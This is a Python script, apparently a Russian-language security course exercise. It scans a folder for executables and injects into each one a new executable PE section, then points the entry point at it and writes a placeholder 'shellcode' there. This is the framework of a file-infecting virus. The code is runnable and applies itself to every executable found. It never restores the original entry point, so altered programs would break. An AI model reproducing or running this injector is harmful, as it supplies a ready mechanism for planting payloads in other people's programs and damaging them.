import mmap
import os
import stat
import pefile

fpath = "C:/Users/krule/PycharmProjects/Task3_InfSeq/task3/"


def find_exec(fpath):
    # поиск исполняемых файлов в папке
    executable = stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH
    ls_files = []
    for filename in os.listdir(fpath):
        if os.path.isfile(fpath + filename):
            st = os.stat(fpath + filename)
            mode = st.st_mode
            if mode & executable:
                ls_files.append(filename)
    return ls_files


def align(val_to_align, alignment):
    if val_to_align % alignment:
        val_to_align = ((val_to_align + alignment) // alignment) * alignment
    return val_to_align


def inject(exe_path):
    print("Работа с файлом " + exe_path + "\n")

    print("1. Изменение размера исполняемого файла")
    print("\tПервоначальный размер: {0} байт".format(os.path.getsize(exe_path)))
    fd = open(exe_path, 'a+b')
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(os.path.getsize(exe_path) + 0x2000)
    map.close()
    fd.close()

    print("\tНовый размер: {0} байт\n".format(os.path.getsize(exe_path)))

    print("2. Добавление заголовка новой секции")
    pe = pefile.PE(exe_path)
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment

    raw_size = align(0x1000, file_alignment)
    virtual_size = align(0x1000, section_alignment)
    raw_offset = align((pe.sections[-1].PointerToRawData +
                        pe.sections[-1].SizeOfRawData),
                       file_alignment)

    virtual_offset = align((pe.sections[-1].VirtualAddress +
                            pe.sections[-1].Misc_VirtualSize),
                           section_alignment)

    characteristics = 0xE0000020
    name = b".test" + (3 * b'\x00')  # 8 байт
    new_section_offset = (pe.sections[-1].get_file_offset() + 40)

    # Создание новой секции
    pe.set_bytes_at_offset(new_section_offset, name)
    print("\tSection Name = %s" % name)
    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
    print("\tVirtual Size = %s" % hex(virtual_size))
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    print("\tVirtual Offset = %s" % hex(virtual_offset))
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    print("\tRaw Size = %s" % hex(raw_size))
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    print("\tRaw Offset = %s" % hex(raw_offset))
    pe.set_bytes_at_offset(new_section_offset + 24, (12 * b'\x00'))
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)
    print("\tCharacteristics = %s\n" % hex(characteristics))

    print("3. Редактирование точки входа")
    pe.FILE_HEADER.NumberOfSections += 1
    print("\tЧисло секций = %s" % pe.FILE_HEADER.NumberOfSections)
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
    print("\tРазмер образа = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage)
    pe.write(exe_path)

    pe = pefile.PE(exe_path)
    new_ep = pe.sections[-1].VirtualAddress
    print("\tНовая точка входа = %s" % hex(pe.sections[-1].VirtualAddress))
    oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    print("\tИзначальная точка входа = %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

    print("4. Вставка Shellcode в новую секцию" )
    shellcode = bytes(b"Hello")

    raw_offset = pe.sections[-1].PointerToRawData
    pe.set_bytes_at_offset(raw_offset, shellcode)
    print("\tShellcode записан в новую секцию")
    pe.write(exe_path)

print("Список исполняемых файлов: ", find_exec(fpath))
for file in find_exec(fpath):
    inject(fpath + file)
